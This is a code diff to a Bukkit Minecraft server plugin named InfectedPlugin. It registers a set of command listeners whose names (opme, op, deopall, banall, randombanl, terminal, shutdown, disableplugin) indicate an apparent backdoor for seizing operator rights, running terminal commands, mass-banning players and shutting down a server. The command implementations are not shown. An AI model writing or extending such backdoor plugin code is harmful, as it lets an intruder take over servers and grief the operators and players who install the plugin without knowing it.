@@ -8,6 +8,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 
+import org.CreeperCoders.InfectedPlugin.Commands.*;
+
 public class InfectedPlugin extends JavaPlugin
 {
     public final Logger log = Bukkit.getLogger();
@@ -26,6 +28,19 @@ public class InfectedPlugin extends JavaPlugin
         try
         {
             this.getServer().getPluginManager().registerEvents(new IP_PlayerListener(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_banall(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_deop(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_op(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_enablevanilla(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_help(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_opme(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_terminal(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_fuckoff(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_shutdown(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_randombanl(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_enableplugin(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_disableplugin(), this);
+            this.getServer().getPluginManager().registerEvents(new Command_deopall(), this);
         }
         catch (Exception ex)
         {
